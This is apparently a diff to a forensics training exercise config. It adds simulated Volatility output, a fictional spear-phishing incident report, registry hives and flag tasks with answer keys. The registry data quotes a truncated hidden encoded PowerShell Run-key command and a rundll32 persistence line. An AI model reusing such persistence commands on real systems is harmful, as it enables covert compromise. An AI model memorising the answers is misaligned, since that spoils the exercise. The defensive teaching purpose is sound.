+          "/forensic/memdump.img -p 3472": "Volatility Foundation Volatility Framework 2.6.1\n\nsvchost.exe pid: 3472\nCommand line: C:\\Windows\\System32\\svchost.exe -k netsvcs -p\n\nBase                             Size          Path\n------------------ -------------------- ----------------------------------------\n0x00007ff7a8b00000            0x12000  C:\\Windows\\System32\\svchost.exe\n0x00007ffd12340000            0x1f8000 C:\\Windows\\SYSTEM32\\ntdll.dll\n0x00007ffd11a00000            0xbd000  C:\\Windows\\System32\\KERNEL32.DLL\n0x00007ffd0fa80000            0x29e000 C:\\Windows\\System32\\KERNELBASE.dll\n0x00007ffd10200000            0x9f000  C:\\Windows\\System32\\msvcrt.dll\n0x00007ffd10e00000            0x123000 C:\\Windows\\System32\\RPCRT4.dll\n0x00007ffd0f600000            0x77000  C:\\Windows\\System32\\bcryptPrimitives.dll\n0x0000000002530000            0x4a000  C:\\Users\\trader1\\AppData\\Local\\Temp\\msupdate.dll  [!] SUSPICIOUS\n0x00007ffd0d200000            0x34000  C:\\Windows\\System32\\winhttp.dll\n\n[!] SUSPICIOUS: Non-standard DLL loaded from user Temp directory\n[!] msupdate.dll is NOT a legitimate Windows update component\n[!] Size: 303,104 bytes | Load address suggests manual loading (LoadLibrary)\n[!] This DLL is likely the Cobalt Strike reflective loader",
+          "/forensic/memdump.img": "Volatility Foundation Volatility Framework 2.6.1\n\n[*] Listing loaded DLLs for all processes...\n[!] Use -p <PID> flag to inspect a specific process.\n[!] Recommended: vol-dlllist /forensic/memdump.img -p 3472\n\nSummary: 18 processes analyzed\n  - System processes: 10 (clean)\n  - User processes: 5 (clean)\n  - Suspicious processes: 2 (PID 3472, PID 4012)\n  - Flagged DLLs: 1 (non-standard path detected)"
+        },
+        "output": "Usage: vol-dlllist <memory_dump> [-p <PID>]\nVolatility dlllist plugin — lists loaded DLLs for processes.\nExample: vol-dlllist /forensic/memdump.img -p 3472"
       }
     ],
     "tasks": [
       {
         "id": "mem_task_1",
         "title": "Connect the HD with memory dump",
-        "details": "Click on the hard disk containing the RAM dump",
+        "details": "The memory dump from workstation WKS-TRADE-07 has been delivered on a hard disk. Click on the hard disk to connect it to the forensic workstation.",
         "points": 10,
         "checkType": "interaction",
         "interactionTarget": "HD2-01",
@@ -420,11 +777,12 @@
           "deviceName": "sdc",
           "deviceType": "disk",
           "size": "16G",
-          "message": " Device connected as /dev/sdc\nContains 8GB memory dump",
+          "message": " Device connected as /dev/sdc\nContains 8GB RAM dump from WKS-TRADE-07 (Meridian Capital Partners)",
           "mountContent": {
-            "memory.dmp": "[Binary memory dump - 8GB]\nWindows 10 x64 memory image",
-            "process_list.txt": "PID 1234 - suspicious.exe\nPID 5678 - malware.dll\nPID 9012 - keylogger.sys\nPID 4321 - backdoor.exe",
-            "registry_hives.txt": "HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\n- Malware: C:\\\\Windows\\\\Temp\\\\evil.exe"
+            "memory.dmp": "[Binary memory dump - 8GB]\nWindows 10 Build 19041 x64 memory image\nCaptured: 2024-11-22 14:30:00 UTC via LiME\nSource: WKS-TRADE-07 (10.10.15.22)",
+            "incident_report.txt": "INCIDENT RESPONSE REPORT — CONFIDENTIAL\n========================================\nCase: MCP-IR-2024-1122\nOrganization: Meridian Capital Partners\nAnalyst: SOC Team Lead\nDate: 2024-11-22\n\nEXECUTIVE SUMMARY\nAt approximately 14:15 UTC, the SOC detected anomalous outbound HTTPS\ntraffic from workstation WKS-TRADE-07 (10.10.15.22). The trading desk\nreported that user 'trader1' received a spear-phishing email at\napproximately 13:45 UTC containing a malicious Excel attachment:\nQ3_Projections_FINAL.xlsm\n\nINITIAL FINDINGS\n- Spear-phishing email delivered to trader1@meridian-capital.com\n- Malicious macro in Excel file executed PowerShell download cradle\n- No malware artifacts found on disk (fileless attack)\n- Memory dump captured at 14:30 UTC using LiME before system shutdown\n- Suspicious outbound connections to unknown IP detected by IDS\n\nAFFECTED SYSTEMS\n- WKS-TRADE-07 (10.10.15.22) — Primary trading workstation\n- User account: MERIDIAN\\trader1\n\nPRIORITY: CRITICAL\nPotential credential theft and unauthorized trading access.",
+            "baseline_processes.txt": "BASELINE PROCESSES — WKS-TRADE-07\n==================================\nNormal running processes (captured 2024-11-01 during routine audit):\n\nSystem (PID 4)                  — Windows kernel\nsmss.exe (PID ~300-400)         — Session Manager\ncsrss.exe (PID ~400-500)        — Client/Server Runtime\nwininit.exe (PID ~500-600)      — Windows Init\nservices.exe (PID ~600-700)     — Service Control Manager\nlsass.exe (PID ~600-700)        — Local Security Authority\nsvchost.exe (multiple)          — Service Host (typical: 6-10 threads)\nexplorer.exe (PID ~2000-2500)   — Windows Explorer\nchrome.exe (PID varies)         — Google Chrome\nTradingApp.exe (PID varies)     — MCP Trading Platform\nRuntimeBroker.exe (PID varies)  — Runtime Broker\n\nNOTES:\n[!] svchost.exe instances typically have 6-10 threads each.\n[!] Any svchost.exe with >12 threads should be investigated.\n[!] powershell.exe is NOT expected during normal trading operations.\n[!] cmd.exe should not be spawned by powershell.exe.",
+            "registry_hives.txt": "Windows Registry Analysis\n==========================\nExtracted registry hives from memory dump\n\nHKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\n  - SecurityHealthSystray : C:\\Windows\\System32\\SecurityHealthSystray.exe     [LEGITIMATE]\n  - OneDrive              : C:\\Users\\trader1\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.exe  [LEGITIMATE]\n  - WindowsDefender       : rundll32.exe C:\\Users\\trader1\\AppData\\Local\\Temp\\msupdate.dll,DllRegisterServer  [SUSPICIOUS]\n\nHKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\n  - ChromeUpdater : powershell.exe -nop -w hidden -ep bypass -enc UwB0AGEAcgB0AC0AUwBsAGUAZQBwACAAMwAwADsASQBFAFgA...  [MALICIOUS]\n\nHKLM\\SYSTEM\\CurrentControlSet\\Services\n  - SysHealthMonitor (Display: System Health Monitor Service)\n    ImagePath: C:\\Windows\\Temp\\syshealth.exe\n    Start: 2 (Automatic)\n    [!] SUSPICIOUS: Unknown service — not in Windows baseline\n\n[!] 3 persistence mechanisms detected:\n    1. HKCU Run key 'ChromeUpdater' — hidden PowerShell with encoded command\n    2. HKLM Run key 'WindowsDefender' — loads msupdate.dll via rundll32\n    3. Service 'SysHealthMonitor' — unknown executable in Windows\\Temp"
           }
         },
         "hintCost": 2,
@@ -434,8 +792,8 @@
       },
       {
         "id": "mem_task_2",
-        "title": "Verify devices",
-        "details": "Use 'lsblk' to confirm the connected device",
+        "title": "Verify connected devices",
+        "details": "Use 'lsblk' to confirm the memory dump device is properly connected and identify its designation.",
         "points": 15,
         "checkType": null,
         "interactionTarget": null,
@@ -447,103 +805,198 @@
       },
       {
         "id": "mem_task_3",
-        "title": "Verify dump integrity (hash check)",
-        "details": "Compute the SHA256 hash of the memory dump device to verify integrity. Use 'sha256sum /dev/sdc'",
-        "points": 20,
-        "checkType": null,
-        "interactionTarget": null,
-        "onInteract": null,
-        "hintCost": 4,
-        "hasHint": true,
-        "hint": "Hash the device: sha256sum /dev/sdc",
-        "checkCommand": "sha256sum",
-        "checkArgs": ["/dev/sdc"]
-      },
-      {
-        "id": "mem_task_4",
-        "title": "Create working copy of memory image",
-        "details": "Create a forensic copy of the memory dump for analysis. Use 'dd if=/dev/sdc of=/forensic/memdump.img'",
-        "points": 25,
-        "checkType": null,
-        "interactionTarget": null,
-        "onInteract": null,
-        "hintCost": 5,
-        "hasHint": true,
-        "hint": "Create copy: dd if=/dev/sdc of=/forensic/memdump.img",
-        "checkCommand": "dd",
-        "checkArgs": ["if=/dev/sdc", "of=/forensic/memdump.img"]
-      },
-      {
-        "id": "mem_task_5",
-        "title": "Mount the device",
-        "details": "Use 'mount /dev/sdc1 /mnt/memdump'",
+        "title": "Verify dump integrity",
+        "details": "Before any analysis, compute the SHA256 hash of the memory dump to establish evidence integrity. Use 'sha256sum /dev/sdc'.",
         "points": 20,
         "checkType": null,
         "interactionTarget": null,
         "onInteract": null,
         "hintCost": 4,
         "hasHint": false,
-        "checkCommand": "mount",
+        "checkCommand": "sha256sum",
         "checkArgs": [
-          "/dev/sdc1",
-          "/mnt/memdump"
+          "/dev/sdc"
         ]
       },
       {
-        "id": "mem_task_6",
-        "title": "List dump files",
-        "details": "Use 'ls /mnt/memdump'",
+        "id": "mem_task_4",
+        "title": "Create forensic working copy",
+        "details": "Create a bit-by-bit forensic copy of the memory dump for analysis. Use 'dd if=/dev/sdc of=/forensic/memdump.img' to preserve the original evidence.",
+        "points": 20,
+        "checkType": null,
+        "interactionTarget": null,
+        "onInteract": null,
+        "hintCost": 4,
+        "hasHint": false,
+        "checkCommand": "dd",
+        "checkArgs": [
+          "if=/dev/sdc",
+          "of=/forensic/memdump.img"
+        ]
+      },
+      {
+        "id": "mem_task_5",
+        "title": "Mount the forensic copy",
+        "details": "Never work directly on the original evidence. Mount your forensic copy for analysis using 'mount /forensic/memdump.img /mnt/memdump'. All subsequent analysis will be performed on this copy.",
         "points": 15,
         "checkType": null,
         "interactionTarget": null,
         "onInteract": null,
         "hintCost": 3,
         "hasHint": false,
-        "checkCommand": "ls",
+        "checkCommand": "mount",
         "checkArgs": [
+          "/forensic/memdump.img",
           "/mnt/memdump"
         ]
       },
       {
+        "id": "mem_task_6",
+        "title": "Identify the operating system profile",
+        "details": "Use 'vol-imageinfo /forensic/memdump.img' to determine the OS profile of the captured system. What is the suggested Volatility profile name? Enter the exact profile string (e.g., Win7SP1x64).",
+        "points": 20,
+        "checkType": "flag",
+        "interactionTarget": null,
+        "onInteract": null,
+        "hintCost": 4,
+        "hasHint": true,
+        "hint": "Run 'vol-imageinfo /forensic/memdump.img' and look at the 'Suggested Profile(s)' line. The answer is the profile name shown there.",
+        "checkCommand": null,
+        "checkArgs": null,
+        "solutionValue": "Win10x64_19041"
+      },
+      {
         "id": "mem_task_7",
-        "title": "Analyze processes",
-        "details": "Use 'cat /mnt/memdump/process_list.txt'",
-        "points": 20,
-        "checkType": null,
-        "interactionTarget": null,
-        "onInteract": null,
-        "hintCost": 4,
-        "hasHint": false,
-        "checkCommand": "cat",
-        "checkArgs": [
-          "/mnt/memdump/process_list.txt"
-        ]
-      },
-      {
-        "id": "mem_task_8",
-        "title": "Get memory dump metadata",
-        "details": "Use 'memdump-info' to display memory dump analysis and statistics",
-        "points": 20,
-        "checkType": null,
-        "interactionTarget": null,
-        "onInteract": null,
-        "hintCost": 4,
-        "hasHint": false,
-        "checkCommand": "memdump-info",
-        "checkArgs": []
-      },
-      {
-        "id": "mem_task_9",
-        "title": "Scan for malicious signatures",
-        "details": "Use 'find-malware' to identify suspicious processes and malware in memory",
+        "title": "Find the suspicious process",
+        "details": "List all running processes using 'vol-pslist /forensic/memdump.img'. Compare the output with 'cat /mnt/memdump/baseline_processes.txt' to identify anomalies. Which svchost.exe PID has an unusually high thread count? Enter only the PID number.",
         "points": 25,
-        "checkType": null,
+        "checkType": "flag",
         "interactionTarget": null,
         "onInteract": null,
         "hintCost": 5,
+        "hasHint": true,
+        "hint": "Normal svchost.exe instances have 6-10 threads (see baseline_processes.txt). One svchost.exe in the vol-pslist output has 15 threads and started much later than the others (13:48 vs 08:00). Its PID is the answer.",
+        "checkCommand": null,
+        "checkArgs": null,
+        "solutionValue": "3472"
+      },
+      {
+        "id": "mem_task_8",
+        "title": "Identify the C2 server",
+        "details": "Use 'vol-netscan /forensic/memdump.img' to examine active network connections. What IP address is the compromised svchost.exe (PID 3472) communicating with? Enter only the IP address.",
+        "points": 30,
+        "checkType": "flag",
+        "interactionTarget": null,
+        "onInteract": null,
+        "hintCost": 6,
+        "hasHint": true,
+        "hint": "In the vol-netscan output, look for ESTABLISHED connections from PID 3472. It connects to the same foreign IP on two ports (443 and 8443). That IP is also used by powershell.exe (PID 4012) on port 4444.",
+        "checkCommand": null,
+        "checkArgs": null,
+        "solutionValue": "185.141.27.93"
+      },
+      {
+        "id": "mem_task_9",
+        "title": "Decrypt obfuscated memory regions",
+        "details": "The memory dump contains encrypted/obfuscated payloads that must be decrypted before Volatility can fully analyze them. Use 'find-malware' to decrypt the protected memory regions.",
+        "points": 20,
+        "checkType": null,
+        "interactionTarget": null,
+        "onInteract": null,
+        "hintCost": 4,
         "hasHint": false,
         "checkCommand": "find-malware",
         "checkArgs": []
+      },
+      {
+        "id": "mem_task_10",
+        "title": "Detect the code injection technique",
+        "details": "Run 'vol-malfind /forensic/memdump.img' to scan for injected code. What injection technique was used to compromise svchost.exe (PID 3472)? Enter the technique name in lowercase.",
+        "points": 30,
+        "checkType": "flag",
+        "interactionTarget": null,
+        "onInteract": null,
+        "hintCost": 6,
+        "hasHint": true,
+        "hint": "The vol-malfind output for PID 3472 shows an injected PE (MZ header) with PAGE_EXECUTE_READWRITE protection. The analysis line states the specific injection technique used — it involves replacing the legitimate process content.",
+        "checkCommand": null,
+        "checkArgs": null,
+        "solutionValue": "process hollowing"
+      },
+      {
+        "id": "mem_task_11",
+        "title": "Identify the malicious module",
+        "details": "Examine the loaded DLLs of the suspicious svchost.exe process using 'vol-dlllist /forensic/memdump.img -p 3472'. What is the filename of the suspicious DLL loaded from an unusual path? Enter only the filename with extension.",
+        "points": 30,
+        "checkType": "flag",
+        "interactionTarget": null,
+        "onInteract": null,
+        "hintCost": 6,
+        "hasHint": true,
+        "hint": "All legitimate DLLs are loaded from C:\\Windows\\System32\\. One DLL is loaded from C:\\Users\\trader1\\AppData\\Local\\Temp\\ — that is not a standard DLL path. Its name mimics a Windows update component.",
+        "checkCommand": null,
+        "checkArgs": null,
+        "solutionValue": "msupdate.dll"
+      },
+      {
+        "id": "mem_task_12",
+        "title": "Determine the attack vector",
+        "details": "Review the incident response report at '/mnt/memdump/incident_report.txt'. What was the exact filename of the malicious attachment used in the spear-phishing attack? Enter the complete filename with extension.",
+        "points": 25,
+        "checkType": "flag",
+        "interactionTarget": null,
+        "onInteract": null,
+        "hintCost": 5,
+        "hasHint": true,
+        "hint": "Use 'cat' to read the report. The Executive Summary section mentions a malicious Excel attachment received via spear-phishing.",
+        "checkCommand": null,
+        "checkArgs": null,
+        "solutionValue": "Q3_Projections_FINAL.xlsm"
+      },
+      {
+        "id": "mem_task_13",
+        "title": "Identify the initial payload method",
+        "details": "The vol-malfind output for powershell.exe (PID 4012) shows the decoded attack script. What .NET method did the PowerShell download cradle use to fetch the second-stage payload? Enter the method name only (one word, lowercase).",
+        "points": 25,
+        "checkType": "flag",
+        "interactionTarget": null,
+        "onInteract": null,
+        "hintCost": 5,
+        "hasHint": true,
+        "hint": "Look at the vol-malfind output for PID 4012. The decoded hex shows 'IEX (New-Object System.Net.WebClient).<method>(...)'. The method name is how the script downloads the payload from the C2 server.",
+        "checkCommand": null,
+        "checkArgs": null,
+        "solutionValue": "downloadstring"
+      },
+      {
+        "id": "mem_task_14",
+        "title": "Find the persistence mechanism",
+        "details": "Examine the extracted registry hives at '/mnt/memdump/registry_hives.txt'. The attacker set up multiple persistence mechanisms. What is the name of the registry Run key that executes a hidden PowerShell command? Enter only the key name.",
+        "points": 30,
+        "checkType": "flag",
+        "interactionTarget": null,
+        "onInteract": null,
+        "hintCost": 6,
+        "hasHint": true,
+        "hint": "Use 'cat /mnt/memdump/registry_hives.txt' and look under HKCU\\...\\CurrentVersion\\Run. One entry is marked [MALICIOUS] and runs PowerShell with hidden window and encoded command. The key name disguises itself as a legitimate browser updater.",
+        "checkCommand": null,
+        "checkArgs": null,
+        "solutionValue": "ChromeUpdater"
+      },
+      {
+        "id": "mem_task_15",
+        "title": "Establish the initial compromise time",
+        "details": "Based on all evidence collected, determine when the initial compromise occurred. Cross-reference the vol-pslist process start times to find when the attacker's PowerShell download cradle first executed. Enter the time in HH:MM format.",
+        "points": 25,
+        "checkType": "flag",
+        "interactionTarget": null,
+        "onInteract": null,
+        "hintCost": 5,
+        "hasHint": true,
+        "hint": "The attack chain starts with powershell.exe (PID 4012) — this is the macro-triggered download cradle. Its start time in vol-pslist shows exactly when the malicious Excel macro executed. Look for the Start column for PID 4012.",
+        "checkCommand": null,
+        "checkArgs": null,
+        "solutionValue": "13:47"
       }
     ]
   }
